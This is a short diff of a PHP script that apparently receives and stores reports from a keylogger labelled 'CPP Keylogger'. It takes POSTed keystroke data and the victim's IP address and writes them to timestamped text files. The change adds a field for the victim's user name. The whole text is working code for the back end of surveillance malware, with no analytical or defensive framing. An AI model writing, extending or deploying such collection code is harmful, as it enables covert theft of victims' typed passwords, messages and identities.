@@ -14,9 +14,10 @@ if (!isset($_POST["ip"])) {
 }
 
 $data = $_POST["data"];
+$user = $_POST["user"];
 $time = date('m/d/Y h:i:s a', time());
 
-$real_message = "[CPP Keylogger]\ndata : {$data}\ntime : {$time}\nip : {$ip}";
+$real_message = "[CPP Keylogger]\ndata : {$data}\nuser : {$user}\ntime : {$time}\nip : {$ip}";
 
 fwrite(fopen(time() . ".txt", "w"), $real_message);
 
